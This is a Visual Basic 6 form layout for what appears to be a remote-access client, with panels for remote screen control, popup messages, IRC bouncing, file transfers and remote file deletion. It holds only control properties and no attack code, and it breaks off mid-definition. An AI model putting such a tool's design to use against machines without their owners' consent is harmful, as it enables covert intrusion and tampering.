VERSION 5.00
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form frmMain 
   BackColor       =   &H00808000&
   BorderStyle     =   0  'None
   ClientHeight    =   6735
   ClientLeft      =   3150
   ClientTop       =   1560
   ClientWidth     =   7455
   ClipControls    =   0   'False
   ControlBox      =   0   'False
   FillColor       =   &H8000000C&
   Icon            =   "frmMain.frx":0000
   MaxButton       =   0   'False
   MinButton       =   0   'False
   NegotiateMenus  =   0   'False
   ScaleHeight     =   6735
   ScaleWidth      =   7455
   StartUpPosition =   1  'CenterOwner
   Begin MSWinsockLib.Winsock wskSwitch 
      Left            =   0
      Top             =   6000
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer tmrAuthour 
      Interval        =   50
      Left            =   1440
      Top             =   5040
   End
   Begin VB.Timer tmrWait 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   960
      Top             =   5040
   End
   Begin MSWinsockLib.Winsock wsk 
      Left            =   0
      Top             =   5520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   3786
   End
   Begin VB.Frame fmeMain 
      Appearance      =   0  'Flat
      BackColor       =   &H00808000&
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   0
      Left            =   120
      TabIndex        =   3
      Top             =   1200
      Width           =   7215
      Begin VB.ListBox lstMain 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C0C0&
         Height          =   4515
         Left            =   120
         TabIndex        =   4
         ToolTipText     =   "Remote|Control is split up into many areas for easier use."
         Top             =   480
         Width           =   2055
      End
      Begin VB.Frame fmeRemoteControl 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   195
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.CheckBox chkControlKeyboard 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            Caption         =   "Control Keyboard"
            ForeColor       =   &H80000008&
            Height          =   255
            Left            =   1560
            TabIndex        =   221
            Top             =   3360
            Value           =   1  'Checked
            Width           =   1815
         End
         Begin VB.CheckBox chkControlMouse 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            Caption         =   "Control Mouse"
            ForeColor       =   &H80000008&
            Height          =   255
            Left            =   1560
            TabIndex        =   220
            Top             =   3000
            Value           =   1  'Checked
            Width           =   1815
         End
         Begin VB.CheckBox chkAutoScale 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            Caption         =   "Autoscale Capture"
            ForeColor       =   &H80000008&
            Height          =   255
            Left            =   1560
            TabIndex        =   219
            Top             =   2160
            Value           =   1  'Checked
            Width           =   1695
         End
         Begin VB.TextBox txtViewScale 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   2880
            MaxLength       =   3
            TabIndex        =   216
            Text            =   "100"
            Top             =   2520
            Width           =   615
         End
         Begin VB.TextBox txtHostScale 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   3000
            MaxLength       =   3
            TabIndex        =   214
            Text            =   "100"
            Top             =   1560
            Width           =   615
         End
         Begin VB.ComboBox cmbColorDepth 
            BackColor       =   &H00C0C0C0&
            Height          =   315
            ItemData        =   "frmMain.frx":0442
            Left            =   2880
            List            =   "frmMain.frx":0452
            Style           =   2  'Dropdown List
            TabIndex        =   212
            Top             =   600
            Width           =   1695
         End
         Begin VB.TextBox txtVerticalPartitions 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1920
            TabIndex        =   210
            Text            =   "5"
            Top             =   720
            Width           =   615
         End
         Begin VB.TextBox txtHorizontalPartitions 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1920
            TabIndex        =   209
            Text            =   "6"
            Top             =   240
            Width           =   615
         End
         Begin VB.Label lblViewScale 
            Alignment       =   1  'Right Justify
            BackStyle       =   0  'Transparent
            Caption         =   "View host screen at                  %"
            Height          =   255
            Left            =   480
            TabIndex        =   215
            Top             =   2520
            Width           =   3135
         End
         Begin VB.Label Label3 
            Alignment       =   1  'Right Justify
            BackStyle       =   0  'Transparent
            Caption         =   "Capture host screen at                  %"
            Height          =   255
            Left            =   600
            TabIndex        =   213
            Top             =   1560
            Width           =   3135
         End
         Begin VB.Label lblColorDepth 
            Alignment       =   2  'Center
            BackStyle       =   0  'Transparent
            Caption         =   "Color Depth"
            Height          =   255
            Left            =   2880
            TabIndex        =   211
            Top             =   240
            Width           =   1575
         End
         Begin VB.Label lblVerticalPartitions 
            Alignment       =   1  'Right Justify
            BackStyle       =   0  'Transparent
            Caption         =   "Vertical Partitions:"
            Height          =   255
            Left            =   120
            TabIndex        =   208
            Top             =   720
            Width           =   1575
         End
         Begin VB.Label lblHorizontalPartitions 
            Alignment       =   1  'Right Justify
            BackStyle       =   0  'Transparent
            Caption         =   "Horizontal Partitions:"
            Height          =   255
            Left            =   120
            TabIndex        =   207
            Top             =   240
            Width           =   1575
         End
         Begin VB.Label cmdStartRemoteControl 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Start RemoteAxs"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H00FFFFFF&
            Height          =   495
            Left            =   1680
            TabIndex        =   196
            Top             =   4080
            Width           =   1215
         End
      End
      Begin VB.Frame fmeMsgBox 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   80
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.Frame fmeMessageBoxes 
            BackColor       =   &H00808000&
            BorderStyle     =   0  'None
            Height          =   3855
            Left            =   120
            TabIndex        =   83
            Tag             =   "0"
            Top             =   840
            Width           =   4575
            Begin VB.OptionButton optMsgInformation 
               BackColor       =   &H00808000&
               Caption         =   "Information"
               Height          =   255
               Left            =   3120
               TabIndex        =   90
               Top             =   1665
               Width           =   1215
            End
            Begin VB.OptionButton optMsgExclamation 
               BackColor       =   &H00808000&
               Caption         =   "Exclamation"
               Height          =   255
               Left            =   960
               TabIndex        =   87
               Top             =   1665
               Width           =   1215
            End
            Begin VB.OptionButton optMsgCritical 
               BackColor       =   &H00808000&
               Caption         =   "Critical"
               Height          =   255
               Left            =   120
               TabIndex        =   86
               Top             =   1665
               Width           =   855
            End
            Begin VB.OptionButton optMsgQuestion 
               BackColor       =   &H00808000&
               Caption         =   "Question"
               Height          =   255
               Left            =   2160
               TabIndex        =   88
               Top             =   1680
               Width           =   975
            End
            Begin VB.TextBox txtTitle 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   1440
               TabIndex        =   84
               Top             =   345
               Width           =   3015
            End
            Begin VB.TextBox txtMsgBox 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   645
               Left            =   1440
               MaxLength       =   150
               MultiLine       =   -1  'True
               TabIndex        =   85
               Top             =   720
               Width           =   3015
            End
            Begin VB.ComboBox cmbStyle 
               BackColor       =   &H00C0C0C0&
               Height          =   315
               ItemData        =   "frmMain.frx":046C
               Left            =   120
               List            =   "frmMain.frx":0485
               Style           =   2  'Dropdown List
               TabIndex        =   92
               Top             =   2265
               Width           =   4335
            End
            Begin VB.Label lblMsgImg 
               BackStyle       =   0  'Transparent
               Caption         =   "Message box type:"
               Height          =   255
               Left            =   120
               TabIndex        =   96
               Top             =   1425
               Width           =   1335
            End
            Begin VB.Label lblTitle 
               BackStyle       =   0  'Transparent
               Caption         =   "Message box title:"
               Height          =   255
               Left            =   120
               TabIndex        =   95
               Top             =   360
               Width           =   1335
            End
            Begin VB.Label lbl 
               BackStyle       =   0  'Transparent
               Caption         =   "Message box text:"
               Height          =   255
               Left            =   120
               TabIndex        =   94
               Top             =   660
               Width           =   1335
            End
            Begin VB.Label lblStyle 
               BackStyle       =   0  'Transparent
               Caption         =   "Message box style:"
               Height          =   255
               Left            =   120
               TabIndex        =   93
               Top             =   2025
               Width           =   3135
            End
            Begin VB.Label cmdSendMsg 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Send"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   3000
               TabIndex        =   91
               Top             =   2640
               Width           =   1455
            End
            Begin VB.Label cmdTestMsg 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Test"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   1440
               TabIndex        =   89
               Top             =   2625
               Width           =   1455
            End
         End
      End
      Begin VB.Frame fmeBouncing 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   120
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.Frame fmeNewBounce 
            Appearance      =   0  'Flat
            BackColor       =   &H00808000&
            Caption         =   "Add New Bounce"
            ForeColor       =   &H80000008&
            Height          =   1695
            Left            =   120
            TabIndex        =   123
            Top             =   3120
            Width           =   4575
            Begin VB.TextBox txtBounceHost 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   2160
               TabIndex        =   129
               Text            =   "irc.server.com"
               Top             =   600
               Width           =   2295
            End
            Begin VB.TextBox txtBouncePort 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   2160
               TabIndex        =   128
               Text            =   "6667"
               Top             =   960
               Width           =   2295
            End
            Begin VB.TextBox txtListenOn 
               Appearance      =   0  'Flat
               BackColor       =   &H00C0C0C0&
               Height          =   285
               Left            =   2160
               TabIndex        =   127
               Text            =   "985"
               Top             =   240
               Width           =   2295
            End
            Begin VB.Label cmdAddBounce 
               Alignment       =   2  'Center
               Appearance      =   0  'Flat
               BackColor       =   &H8000000D&
               BorderStyle     =   1  'Fixed Single
               Caption         =   "Add to Bounce List"
               BeginProperty Font 
                  Name            =   "Arial"
                  Size            =   9
                  Charset         =   0
                  Weight          =   700
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               ForeColor       =   &H80000009&
               Height          =   255
               Left            =   120
               TabIndex        =   130
               Top             =   1320
               Width           =   4335
            End
            Begin VB.Label lblBouncePort 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "Bounce connection to:"
               Height          =   255
               Left            =   120
               TabIndex        =   126
               Top             =   960
               Width           =   1935
            End
            Begin VB.Label lblBounceHost 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "Bounce connection to:"
               Height          =   255
               Left            =   120
               TabIndex        =   125
               Top             =   600
               Width           =   1935
            End
            Begin VB.Label lblListenOn 
               Alignment       =   1  'Right Justify
               BackStyle       =   0  'Transparent
               Caption         =   "Upon connection on port:"
               Height          =   255
               Index           =   0
               Left            =   120
               TabIndex        =   124
               Top             =   240
               Width           =   1935
            End
         End
         Begin VB.ListBox lstBounces 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   2175
            Left            =   120
            TabIndex        =   122
            Top             =   360
            Width           =   4575
         End
         Begin VB.Label lblBounceUpdate 
            Alignment       =   2  'Center
            BackColor       =   &H00FFFFFF&
            BackStyle       =   0  'Transparent
            Caption         =   "NOT UPLOADED"
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H000000FF&
            Height          =   255
            Left            =   3120
            TabIndex        =   135
            Top             =   120
            Width           =   1575
         End
         Begin VB.Label cmdUpdateBounce 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Upload List"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   2400
            TabIndex        =   134
            Top             =   2760
            Width           =   2295
         End
         Begin VB.Label cmdRefreshBounce 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Retrieve List"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   120
            TabIndex        =   133
            Top             =   2760
            Width           =   2295
         End
         Begin VB.Label cmdClearBounce 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Clear List"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   2400
            TabIndex        =   132
            Top             =   2520
            Width           =   2295
         End
         Begin VB.Label cmdRemoveBounce 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Remove Bounce"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   120
            TabIndex        =   131
            Top             =   2520
            Width           =   2295
         End
         Begin VB.Label lblBounceList 
            BackStyle       =   0  'Transparent
            Caption         =   "Current Bounces:"
            Height          =   255
            Left            =   120
            TabIndex        =   121
            Top             =   120
            Width           =   4575
         End
      End
      Begin VB.Frame fmeTransfers 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H80000008&
         Height          =   4935
         Left            =   2280
         TabIndex        =   97
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin VB.Timer tmrSpeed 
            Interval        =   1000
            Left            =   4320
            Top             =   120
         End
         Begin VB.TextBox txtTransferDestination 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            ForeColor       =   &H00800000&
            Height          =   285
            Left            =   3240
            Locked          =   -1  'True
            TabIndex        =   112
            Top             =   720
            Width           =   1335
         End
         Begin VB.TextBox txtTransferSource 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            ForeColor       =   &H00800000&
            Height          =   285
            Left            =   720
            Locked          =   -1  'True
            TabIndex        =   110
            Top             =   720
            Width           =   1335
         End
         Begin MSComctlLib.ProgressBar pbTransfer 
            Height          =   255
            Left            =   120
            TabIndex        =   108
            Top             =   1440
            Width           =   4335
            _ExtentX        =   7646
            _ExtentY        =   450
            _Version        =   393216
            BorderStyle     =   1
            Appearance      =   0
            Scrolling       =   1
         End
         Begin MSComctlLib.ListView lstTransfers 
            Height          =   2295
            Left            =   120
            TabIndex        =   98
            Top             =   2280
            Width           =   4575
            _ExtentX        =   8070
            _ExtentY        =   4048
            View            =   3
            LabelEdit       =   1
            LabelWrap       =   -1  'True
            HideSelection   =   0   'False
            FullRowSelect   =   -1  'True
            GridLines       =   -1  'True
            _Version        =   393217
            ForeColor       =   -2147483640
            BackColor       =   12632256
            BorderStyle     =   1
            Appearance      =   0
            NumItems        =   4
            BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               Text            =   "Type"
               Object.Width           =   1764
            EndProperty
            BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               SubItemIndex    =   1
               Text            =   "Source"
               Object.Width           =   4410
            EndProperty
            BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               SubItemIndex    =   2
               Text            =   "Destination"
               Object.Width           =   4410
            EndProperty
            BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
               SubItemIndex    =   3
               Text            =   "File Size"
               Object.Width           =   1764
            EndProperty
         End
         Begin VB.Label cmdClearTransfers 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Clear"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   1080
            TabIndex        =   197
            Top             =   4560
            Width           =   975
         End
         Begin VB.Label cmdPauseTransfer 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Pause"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   2280
            TabIndex        =   115
            Top             =   1680
            Width           =   1095
         End
         Begin VB.Label cmdCancelTransfer 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Cancel"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   3360
            TabIndex        =   114
            Top             =   1680
            Width           =   1095
         End
         Begin VB.Label txtTransferBytes 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "0 of 0 bytes"
            ForeColor       =   &H00800000&
            Height          =   255
            Left            =   1200
            TabIndex        =   113
            Top             =   1080
            Width           =   2655
         End
         Begin VB.Label lblDestination 
            BackStyle       =   0  'Transparent
            Caption         =   "Destination:"
            Height          =   255
            Left            =   2280
            TabIndex        =   111
            Top             =   720
            Width           =   855
         End
         Begin VB.Label lblSource 
            BackStyle       =   0  'Transparent
            Caption         =   "Source:"
            Height          =   255
            Left            =   120
            TabIndex        =   109
            Top             =   720
            Width           =   615
         End
         Begin VB.Label cmdQueueDown 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Move Down"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   2280
            TabIndex        =   107
            Top             =   4560
            Width           =   1215
         End
         Begin VB.Label cmdQueueUp 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Move Up"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   3480
            TabIndex        =   106
            Top             =   4560
            Width           =   1215
         End
         Begin VB.Label cmdCancel 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Cancel"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   120
            TabIndex        =   105
            Top             =   4560
            Width           =   975
         End
         Begin VB.Label txtTransferSpeed 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            BorderStyle     =   1  'Fixed Single
            ForeColor       =   &H00800000&
            Height          =   255
            Left            =   3240
            TabIndex        =   104
            Top             =   480
            Width           =   1335
         End
         Begin VB.Label lblSpeed 
            BackStyle       =   0  'Transparent
            Caption         =   "Speed:"
            Height          =   255
            Left            =   2280
            TabIndex        =   103
            Top             =   480
            Width           =   615
         End
         Begin VB.Label txtTransferType 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "None"
            ForeColor       =   &H00800000&
            Height          =   255
            Left            =   720
            TabIndex        =   102
            Top             =   480
            Width           =   1335
         End
         Begin VB.Label lblDirection 
            BackStyle       =   0  'Transparent
            Caption         =   "Type:"
            Height          =   255
            Left            =   120
            TabIndex        =   101
            Top             =   480
            Width           =   495
         End
         Begin VB.Label lblTransfer 
            BackStyle       =   0  'Transparent
            Caption         =   "Current Transfer:"
            Height          =   255
            Left            =   120
            TabIndex        =   100
            Top             =   120
            Width           =   1335
         End
         Begin VB.Label lblQueue 
            BackStyle       =   0  'Transparent
            Caption         =   "Transfer Queue:"
            Height          =   255
            Left            =   120
            TabIndex        =   99
            Top             =   2040
            Width           =   1575
         End
      End
      Begin VB.Frame fmeFileManager 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         ForeColor       =   &H00000000&
         Height          =   4935
         Left            =   2280
         TabIndex        =   30
         Top             =   120
         Visible         =   0   'False
         Width           =   4815
         Begin MSComctlLib.ImageList ilFileBrowser 
            Left            =   4200
            Top             =   4320
            _ExtentX        =   1005
            _ExtentY        =   1005
            BackColor       =   -2147483643
            ImageWidth      =   32
            ImageHeight     =   32
            MaskColor       =   16777215
            _Version        =   393216
            BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
               NumListImages   =   5
               BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frmMain.frx":04DB
                  Key             =   ""
               EndProperty
               BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frmMain.frx":092F
                  Key             =   ""
               EndProperty
               BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frmMain.frx":0D83
                  Key             =   "removeable"
               EndProperty
               BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frmMain.frx":11D7
                  Key             =   ""
               EndProperty
               BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
                  Picture         =   "frmMain.frx":1DC9
                  Key             =   ""
               EndProperty
            EndProperty
         End
         Begin VB.TextBox txtPath 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   285
            Left            =   1080
            Locked          =   -1  'True
            TabIndex        =   119
            Top             =   4560
            Width           =   3615
         End
         Begin MSComDlg.CommonDialog cdTransfer 
            Left            =   4320
            Top             =   120
            _ExtentX        =   847
            _ExtentY        =   847
            _Version        =   393216
            CancelError     =   -1  'True
            DialogTitle     =   "Save File"
         End
         Begin VB.Timer tmrDblClick 
            Enabled         =   0   'False
            Interval        =   750
            Left            =   0
            Top             =   120
         End
         Begin VB.ComboBox cmbDrives 
            Appearance      =   0  'Flat
            BackColor       =   &H00C0C0C0&
            Height          =   315
            Left            =   720
            Sorted          =   -1  'True
            Style           =   2  'Dropdown List
            TabIndex        =   82
            Top             =   630
            Width           =   1455
         End
         Begin MSComctlLib.ListView lstFileManager 
            Height          =   3615
            Left            =   120
            TabIndex        =   31
            Top             =   960
            Width           =   4575
            _ExtentX        =   8070
            _ExtentY        =   6376
            Arrange         =   2
            MultiSelect     =   -1  'True
            LabelWrap       =   -1  'True
            HideSelection   =   -1  'True
            GridLines       =   -1  'True
            _Version        =   393217
            Icons           =   "ilFileBrowser"
            SmallIcons      =   "imlFileManager"
            ColHdrIcons     =   "imlFileManager"
            ForeColor       =   -2147483640
            BackColor       =   12632256
            BorderStyle     =   1
            Appearance      =   0
            BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Arial"
               Size            =   8.25
               Charset         =   0
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            NumItems        =   0
         End
         Begin VB.Label lblDrives 
            BackStyle       =   0  'Transparent
            Caption         =   "Drives:"
            Height          =   375
            Left            =   120
            TabIndex        =   189
            Top             =   640
            Width           =   615
         End
         Begin VB.Label lblCurrentPath 
            BackStyle       =   0  'Transparent
            Caption         =   "Current Path:"
            Height          =   255
            Left            =   120
            TabIndex        =   188
            Top             =   4560
            Width           =   975
         End
         Begin VB.Label cmdPasteFile 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Paste File"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   3480
            TabIndex        =   187
            Top             =   660
            Width           =   1095
         End
         Begin VB.Label cmdCopyFile 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "Copy File"
            BeginProperty Font 
               Name            =   "Arial"
               Size            =   9
               Charset         =   0
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   255
            Left            =   2280
            TabIndex        =   186
            Top             =   660
            Width           =   1095
         End
         Begin VB.Label cmdRefresh 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "±"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   14.25
               Charset         =   2
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   840
            TabIndex        =   117
            ToolTipText     =   "Refresh current directory."
            Top             =   240
            Width           =   615
         End
         Begin VB.Label cmdDrives 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "µ"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   14.25
               Charset         =   2
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   240
            TabIndex        =   116
            ToolTipText     =   "Go back to drive list."
            Top             =   240
            Width           =   615
         End
         Begin VB.Label cmdUp 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "È"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   14.25
               Charset         =   2
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   1440
            TabIndex        =   36
            ToolTipText     =   "Go to parent directory."
            Top             =   240
            Width           =   615
         End
         Begin VB.Label cmdOpen 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "ü"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   15.75
               Charset         =   2
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   3240
            TabIndex        =   35
            ToolTipText     =   "Open file on remote computer."
            Top             =   240
            Width           =   615
         End
         Begin VB.Label cmdDelete 
            Alignment       =   2  'Center
            Appearance      =   0  'Flat
            BackColor       =   &H8000000D&
            BorderStyle     =   1  'Fixed Single
            Caption         =   "û"
            BeginProperty Font 
               Name            =   "Wingdings"
               Size            =   15.75
               Charset         =   2
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            ForeColor       =   &H80000009&
            Height          =   375
            Left            =   3840
            TabIndex        =   34
            ToolTipText     =   "Delete file on remote computer."
